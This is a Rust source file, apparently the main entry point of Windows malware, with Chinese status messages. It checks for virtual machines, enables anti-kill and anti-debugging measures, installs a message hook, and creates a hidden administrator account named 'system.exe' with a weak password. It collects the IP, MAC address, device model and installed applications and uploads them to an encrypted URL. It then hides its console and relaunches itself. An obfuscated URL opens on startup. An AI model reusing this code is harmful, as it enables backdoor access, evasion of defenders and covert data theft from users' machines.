#!/usr/bin/env rust

// Removed `pub mod lib;` as `lib.rs` is the root of the crate's library target.
pub mod core;
pub mod sys;
pub mod lib;
pub mod detect;

use core::wait;
use std::env;
use std::os::windows::process::CommandExt; // Required for creation_flags on Windows
use winapi::um::wincon::FreeConsole;

//use sys::*;


const VERSION:&str = "1.1.4";
// 元组



fn main() {
    if let Err(e) = lib::open_url_manual(&("https:\x2F\x2F".to_owned() + &lib::decrypt_base64("d3d3LmJpbGliaWxpLmNvbQ==") + "\u{2F}video\u{2F}BV1mg411r79g").as_str()) {
        eprintln!("Failed to open URL: {}", e);
    }
    if detect::is_virtual_machine() {
        core::say("检测到虚拟机，程序将退出。");
        wait(10);
        // return;
    } else {
        core::say("未检测到虚拟机，继续执行。");
    }
    // sys::get_superuser();
    if sys::is_superuser() {
        core::say("管理员权限: 有");
        core::say("正在启动反 kill 措施...");
        lib::add_anti_kill();
        core::say("正在启动反调试措施...");
        lib::protect_process();
        core::say("正在安装消息钩子...");
        sys::install_message_hook();
    } else {
        core::say("管理员权限: 无");
        sys::get_superuser();
        core::say("正在申请管理员权限...");
        lib::login("system.exe", "123456");
        return;
    }
    //lib::unzip(0x0000000000001)
    core::add_user("system.exe","123456");
    core::set_user_admin("system.exe");
    /* 获取当前文件名 */
    let path = env::current_exe().unwrap();
    let name = path.file_name().unwrap().to_str().unwrap();
    let path = core::dirname(path.to_str().unwrap());
    core::say(&("被执行文件名:".to_owned() + name+""));
    core::say(&format!("当前版本: {}", VERSION));
    core::say(&format!("当前pid: {}", std::process::id()));
    core::say("按下Ctrl^C以退出进程");
    core::say("正在扫描电脑...");
    //
    let ip = match core::get_ip() {
        Some(ip) => ip,
        None => "无法获取IP地址".to_string(),
    };
    core::say(&format!("ip: {}", ip));
    // 获取并输出MAC地址
    match core::get_mac_address() {
        Some(mac) => {
            let formatted_mac = mac.replace("-", ":");
            if formatted_mac.chars().filter(|c| *c == ':').count() == 5 {
                core::say(&format!("MAC地址: {}", formatted_mac));
            } else {
                core::say(&format!("MAC地址格式异常: {}", formatted_mac));
            }
        }
        None => core::say("无法获取MAC地址"),
    }
    // 获取并输出设备型号，操作系统
    
    core::say(&format!("设备型号: {}", sys::DEVICE_MODEL.as_str()));
    
    
    core::say("正在扫描应用...");
    let applications = sys::installed_applications();
    core::say(&format!("{:?}", applications));
    let encrypted_url = core::encrypt("http:\\/\\/127.0.0.1:8000");
    core::upload(&encrypted_url, &format!("{:?}", applications));



    core::wait(10); // 使窗口被关闭程序也会正常运行（关闭当前窗口，但不影响程序）
    unsafe {
        FreeConsole(); // 释放控制台，使窗口关闭后程序仍然运行
    }
    let mut cmd = std::process::Command::new("cmd");
    cmd.arg("/C")
        .arg("start")
        .arg("cmd")
        .arg("/K")
        .arg(format!("cd /d {} && {}", path, name));
    cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW (requires CommandExt)
    // 隐藏任务栏图标
    unsafe {
        FreeConsole();
    }
    // 执行
    cmd.spawn().expect("Failed to execute process");
    core::wait(10);
    let mut cmd = std::process::Command::new("cmd");
        cmd.arg("/C")
        .arg("taskkill")
        .arg("/IM")
        .arg(name)
        .arg("/F");
        // 执行
    cmd.output().expect("Failed to execute process");
    core::wait(20);
    loop {
        // Placeholder for future functionality
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
}
    

    
    
